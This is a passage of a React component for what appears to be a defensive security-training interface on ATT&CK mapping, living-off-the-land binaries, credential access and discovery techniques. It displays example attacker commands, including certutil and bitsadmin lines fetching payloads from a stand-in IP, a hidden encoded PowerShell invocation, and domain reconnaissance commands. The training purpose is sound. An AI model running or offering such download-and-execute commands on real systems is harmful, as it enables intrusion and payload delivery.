                  sound.playClick();
                  setContextScenario(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  contextScenario === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Dual-Identity Comparison */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">OBSERVED COMMAND: whoami /all &amp; net localgroup administrators</span>
              <Badge className="bg-cyan-500/20 text-cyan-300 text-[11px]">IDENTICAL MECHANIC: T1033 + T1087.001</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div className={`p-3.5 rounded-xl border ${contextScenario === 'admin_sync' ? 'bg-emerald-950/40 border-emerald-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-emerald-400 font-bold text-xs">IT ADMIN MIGRATION</span>
                  <Badge className="bg-emerald-950 text-emerald-300 border-emerald-500/30 text-[11px]">AUTHORIZED BENIGN</Badge>
                </div>
                <div className="space-y-1.5 mt-2 text-slate-300 text-xs">
                  <div>User: <span className="text-white font-bold">CORP\\svc-sysadmin</span></div>
                  <div>Parent: <span className="text-white">services.exe -&gt; script.ps1</span></div>
                  <div>Context: Approved change ticket #CR-4412 for backup migration.</div>
                </div>
                <div className="mt-3 p-2 rounded bg-black/50 border border-emerald-800/40 text-emerald-300 text-[11px]">
                  ATT&amp;CK: T1087.001 • VERDICT: BENIGN AUTHORIZED ✓
                </div>
              </div>

              <div className={`p-3.5 rounded-xl border ${contextScenario === 'attacker_recon' ? 'bg-rose-950/40 border-rose-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-rose-400 font-bold text-xs">ADVERSARY RECONNAISSANCE</span>
                  <Badge className="bg-rose-950 text-rose-300 border-rose-500/30 text-[11px]">UNAUTHORIZED INTRUSION</Badge>
                </div>
                <div className="space-y-1.5 mt-2 text-slate-300 text-xs">
                  <div>User: <span className="text-white font-bold">IIS_IUSRS</span> (Web Server Service Account)</div>
                  <div>Parent: <span className="text-white">w3wp.exe -&gt; cmd.exe</span> (Web Shell Spawn)</div>
                  <div>Context: Executed at 03:14 UTC with external IP connect.</div>
                </div>
                <div className="mt-3 p-2 rounded bg-black/50 border border-rose-800/40 text-rose-300 text-[11px]">
                  ATT&amp;CK: T1087.001 • VERDICT: MALICIOUS UNAUTHORIZED ⛔
                </div>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">ANANYA'S INTENT DOCTRINE:</span> The ATT&amp;CK tag is identical in both cases. An analyst who assumes T1087 implies an active attacker risks false-positive chaos and premature containment.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'des-observed-mechanic' ? (
                          <Activity className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'des-technique-label' ? (
                          <Tag className="w-6 h-6 text-blue-400" />
                        ) : node.id === 'des-context-evaluation' ? (
                          <UserCheck className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 5. STYLE: m13-observable-technique-pipeline (Observable Technique Pipeline)
  // ---------------------------------------------------------------------------
  if (style === 'm13-observable-technique-pipeline') {
    const nodes = observableTechniquePipelineNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Workflow className="w-5 h-5 text-cyan-400" />
                <span>Observable-to-Technique Mapping Pipeline</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Systematic 4-step transformation from raw Sysmon/EDR telemetry into calibrated ATT&amp;CK technique tags.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              MAPPING PIPELINE
            </Badge>
          </div>

          {/* Pipeline Stepper */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">STAGE:</span>
            {[
              { id: 'raw_log', label: '1. Raw Command Event', node: 'obs-raw-command-event' },
              { id: 'parsing', label: '2. Behavioral Parsing', node: 'obs-behavioral-parsing' },
              { id: 'mitre_match', label: '3. Technique Tagging', node: 'obs-technique-tagging' },
              { id: 'evidence_docket', label: '4. Ananya\'s Mapping Rigor', node: 'obs-ananya-mapping-rigor' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setPipelineStage(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  pipelineStage === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Stepper Visualizer */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">PIPELINE EXECUTION: EVENT #SYS-4688</span>
              <Badge className="bg-emerald-500/20 text-emerald-300 text-[11px]">CALIBRATED MATCH</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-4 gap-2.5">
              <div className={`p-3 rounded-lg border ${pipelineStage === 'raw_log' ? 'bg-cyan-950/50 border-cyan-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-cyan-400 font-bold">1. RAW TELEMETRY</span>
                <p className="text-slate-300 text-[11px] mt-1">Image: C:\\Windows\\System32\\net.exe</p>
                <p className="text-slate-400 text-[11px]">Args: net user /domain</p>
              </div>

              <div className={`p-3 rounded-lg border ${pipelineStage === 'parsing' ? 'bg-purple-950/50 border-purple-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-purple-400 font-bold">2. BEHAVIOR PARSER</span>
                <p className="text-slate-300 text-[11px] mt-1">Action: Enumerate user accounts from Active Directory.</p>
                <p className="text-slate-400 text-[11px]">Intent: Situational Recon</p>
              </div>

              <div className={`p-3 rounded-lg border ${pipelineStage === 'mitre_match' ? 'bg-blue-950/50 border-blue-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-blue-400 font-bold">3. ATT&amp;CK MATCH</span>
                <p className="text-white text-[11px] mt-1 font-bold">T1087.002</p>
                <p className="text-slate-300 text-[11px]">Domain Account Discovery</p>
              </div>

              <div className={`p-3 rounded-lg border ${pipelineStage === 'evidence_docket' ? 'bg-emerald-950/50 border-emerald-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-emerald-400 font-bold">4. DOCKET ANCHOR</span>
                <p className="text-emerald-300 text-[11px] mt-1 font-bold">Confidence: High</p>
                <p className="text-slate-300 text-[11px]">Bound to Event GUID and CLI.</p>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800 flex items-center justify-between text-xs">
              <span className="text-slate-300">
                <span className="text-cyan-400 font-bold">RULE:</span> Never map without the exact observable command line string logged in the ticket.
              </span>
              <span className="text-emerald-400 font-bold">PROVENANCE ANCHORED ✓</span>
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'obs-raw-command-event' ? (
                          <Terminal className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'obs-behavioral-parsing' ? (
                          <Binary className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'obs-technique-tagging' ? (
                          <Tag className="w-6 h-6 text-blue-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-emerald-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 6. STYLE: m13-dual-use-lolbins-paradox (Dual-Use LOLBins Paradox)
  // ---------------------------------------------------------------------------
  if (style === 'm13-dual-use-lolbins-paradox') {
    const nodes = dualUseLolbinsParadoxNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Binary className="w-5 h-5 text-cyan-400" />
                <span>Dual-Use Utilities (LOLBins) &amp; The Living-off-the-Land Paradox</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Adversaries abuse legitimate Windows binaries to blend into regular system noise.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              LOLBIN DISCRIMINATION
            </Badge>
          </div>

          {/* LOLBin Binary Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">BINARY:</span>
            {[
              { id: 'certutil', label: '1. certutil.exe (Ingress Tool Transfer)', node: 'lol-dual-use-binary' },
              { id: 'powershell', label: '2. powershell.exe (Scripting Engine)', node: 'lol-admin-use-case' },
              { id: 'bitsadmin', label: '3. bitsadmin.exe (Background Download)', node: 'lol-adversary-use-case' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setLolbinSelected(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  lolbinSelected === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Dual-Identity Comparison Card */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">
                ANALYSIS TARGET: {lolbinSelected.toUpperCase()}.EXE
              </span>
              <Badge className="bg-purple-500/20 text-purple-300 text-[11px]">LIVING-OFF-THE-LAND DUAL IDENTITY</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div className="p-3.5 rounded-xl bg-slate-900/50 border border-slate-800 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-emerald-400 font-bold text-xs">LEGITIMATE ADMIN PURPOSE</span>
                  <Badge className="bg-emerald-950 text-emerald-300 text-[11px]">BENIGN DEFAULT</Badge>
                </div>
                <div className="p-2 rounded bg-black/60 border border-slate-800 text-emerald-200 text-xs">
                  {lolbinSelected === 'certutil'
                    ? 'certutil -verify C:\\Certs\\CorporateCA.crt'
                    : lolbinSelected === 'powershell'
                    ? 'Get-Service | Where-Object Status -eq "Running"'
                    : 'bitsadmin /list /allusers'}
                </div>
                <p className="text-slate-300 text-xs">
                  Native administrative utility shipped with Windows OS for system management.
                </p>
              </div>

              <div className="p-3.5 rounded-xl bg-rose-950/40 border border-rose-500/40 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-rose-400 font-bold text-xs">WEAPONIZED ADVERSARY USE</span>
                  <Badge className="bg-rose-950 text-rose-300 text-[11px]">ATT&amp;CK: T1105 / T1059</Badge>
                </div>
                <div className="p-2 rounded bg-black/60 border border-rose-900/40 text-rose-200 text-xs">
                  {lolbinSelected === 'certutil'
                    ? 'certutil -urlcache -split -f http://198.51.100.24/beacon.exe C:\\Temp\\svchost.exe'
                    : lolbinSelected === 'powershell'
                    ? 'powershell -nop -w hidden -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGo...'
                    : 'bitsadmin /transfer eviljob http://198.51.100.24/stage2.dll C:\\Temp\\stage2.dll'}
                </div>
                <p className="text-slate-300 text-xs">
                  Used by attackers to bypass proxy inspection and download secondary payloads.
                </p>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">FORENSIC DISCRIMINATOR:</span> Check parent process lineage, outbound network connection to untrusted IPs, and write path destination (e.g. `C:\\Users\\Public` or `C:\\Temp`).
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'lol-dual-use-binary' ? (
                          <Binary className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'lol-admin-use-case' ? (
                          <UserCheck className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'lol-adversary-use-case' ? (
                          <Bug className="w-6 h-6 text-rose-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 7. STYLE: m13-credential-access-matrix (Credential Access Matrix)
  // ---------------------------------------------------------------------------
  if (style === 'm13-credential-access-matrix') {
    const nodes = credentialAccessMatrixNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Key className="w-5 h-5 text-cyan-400" />
                <span>Credential Access TTP Mechanics: Memory, Spraying &amp; Vault Theft</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Understand high-impact techniques adversaries use to harvest credentials across endpoints and directories.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              CREDENTIAL ACCESS
            </Badge>
          </div>

          {/* Credential Technique Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">TTP:</span>
            {[
              { id: 'lsass', label: '1. T1003.001 LSASS Memory Dump', node: 'crd-lsass-memory-dump' },
              { id: 'spray', label: '2. T1110.003 Password Spraying', node: 'crd-password-spray-matrix' },
              { id: 'vault', label: '3. T1555 Browser Vault Theft', node: 'crd-browser-vault-theft' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setCredTechnique(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  credTechnique === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Credential Telemetry Visualizer */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">TELEMETRY CORROBORATION: TA0006 CREDENTIAL ACCESS</span>
              <Badge className="bg-purple-500/20 text-purple-300 text-[11px]">HIGH DETECTION CRITICALITY</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className={`p-3.5 rounded-xl border ${credTechnique === 'lsass' ? 'bg-cyan-950/50 border-cyan-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-cyan-300 font-bold">T1003.001 LSASS DUMP</span>
                <p className="text-slate-300 text-xs mt-1">Direct memory reading of Local Security Authority Subsystem Service.</p>
                <div className="p-2 rounded bg-black/60 border border-slate-800 text-[11px] text-cyan-200 mt-2 space-y-0.5">
                  <div>Telemetry: Sysmon Event ID 10</div>
                  <div>Target: lsass.exe</div>
                  <div>AccessMask: 0x0010 (VM_READ)</div>
                </div>
              </div>

              <div className={`p-3.5 rounded-xl border ${credTechnique === 'spray' ? 'bg-purple-950/50 border-purple-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-purple-300 font-bold">T1110.003 PASSWORD SPRAY</span>
                <p className="text-slate-300 text-xs mt-1">Testing 1 common password against 1,000+ domain user accounts.</p>
                <div className="p-2 rounded bg-black/60 border border-slate-800 text-[11px] text-purple-200 mt-2 space-y-0.5">
                  <div>Telemetry: Windows Event ID 4625</div>
                  <div>Pattern: Distributed across users</div>
                  <div>Avoids account lockout thresh</div>
                </div>
              </div>

              <div className={`p-3.5 rounded-xl border ${credTechnique === 'vault' ? 'bg-emerald-950/50 border-emerald-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <span className="text-emerald-300 font-bold">T1555 CREDENTIAL VAULT</span>
                <p className="text-slate-300 text-xs mt-1">Extracting saved credentials from Chromium Login Data SQLite DB.</p>
                <div className="p-2 rounded bg-black/60 border border-slate-800 text-[11px] text-emerald-200 mt-2 space-y-0.5">
                  <div>File: %LocalAppData%\\Google\\...</div>
                  <div>Key: CryptUnprotectData (DPAPI)</div>
                  <div>Extracts browser web passwords</div>
                </div>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800 text-xs flex items-center justify-between">
              <span className="text-slate-300">
                <span className="text-cyan-400 font-bold">DEFENSIVE COUNTERMEASURE:</span> Enable LSA Protection (RunAsPPL) and Credential Guard to block T1003.001 memory handles.
              </span>
              <span className="text-emerald-400 font-bold">CRITICAL DEFENSE ✓</span>
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'crd-lsass-memory-dump' ? (
                          <Cpu className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'crd-password-spray-matrix' ? (
                          <Radio className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'crd-browser-vault-theft' ? (
                          <Folder className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-blue-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 8. STYLE: m13-discovery-ttps-recon (Discovery TTPs Recon)
  // ---------------------------------------------------------------------------
  if (style === 'm13-discovery-ttps-recon') {
    const nodes = discoveryTtpsReconNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Search className="w-5 h-5 text-cyan-400" />
                <span>Discovery TTPs: Account, Network &amp; Host Situational Awareness</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                How adversaries orient themselves after initial access to locate sensitive targets and defensive controls.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              RECONNAISSANCE TTPS
            </Badge>
          </div>

          {/* Discovery Category Tabs */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">RECON:</span>
            {[
              { id: 'accounts', label: '1. T1087 Account Discovery', node: 'dsc-account-discovery' },
              { id: 'network', label: '2. T1018 / T1016 Network Recon', node: 'dsc-network-discovery' },
              { id: 'system', label: '3. T1082 Remote Host & Software', node: 'dsc-remote-host-discovery' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setDiscCategory(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  discCategory === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Recon CLI Terminal */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">TERMINAL: ADVERSARY RECONNAISSANCE CADENCE</span>
              <Badge className="bg-emerald-500/20 text-emerald-300 text-[11px]">DISCOVERY CLUSTERING</Badge>
            </div>

            <div className="p-3.5 rounded-xl bg-black/80 border border-slate-800 text-slate-300 space-y-2">
              <div className="flex items-center gap-2 text-cyan-400 font-bold text-xs">
                <Terminal className="w-4 h-4" />
                <span>C:\\Windows\\System32\\cmd.exe</span>
              </div>
              <div className="text-white text-xs pl-2 font-mono">
                {discCategory === 'accounts' ? (
                  <>
                    <p className="text-emerald-400">&gt; whoami /groups</p>
                    <p className="text-slate-400">CORP\\Domain Users, CORP\\Remote Desktop Users...</p>
                    <p className="text-emerald-400 mt-1">&gt; net group "Domain Admins" /domain</p>
                    <p className="text-slate-400">Members: Administrator, SVC-SQL-ADMIN, DA-Karthik...</p>
                  </>
                ) : discCategory === 'network' ? (
                  <>
                    <p className="text-emerald-400">&gt; ipconfig /all</p>
                    <p className="text-slate-400">IPv4 Address: 10.10.20.15 (Subnet: 255.255.255.0)</p>
                    <p className="text-emerald-400 mt-1">&gt; arp -a</p>
                    <p className="text-slate-400">10.10.20.1 (Gateway), 10.10.20.4 (Domain Controller)...</p>
                  </>
                ) : (
                  <>
                    <p className="text-emerald-400">&gt; systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</p>
                    <p className="text-slate-400">OS Name: Microsoft Windows 11 Enterprise</p>
                    <p className="text-emerald-400 mt-1">&gt; tasklist /v | findstr edr</p>
                    <p className="text-slate-400">EdrAgent.exe PID 1120 Session 0 Services</p>
                  </>
                )}
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">DETECTION OPPORTUNITY:</span> Individual discovery commands look benign, but a tight burst of 4+ recon commands within 60 seconds is a signature of automated post-exploitation discovery.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
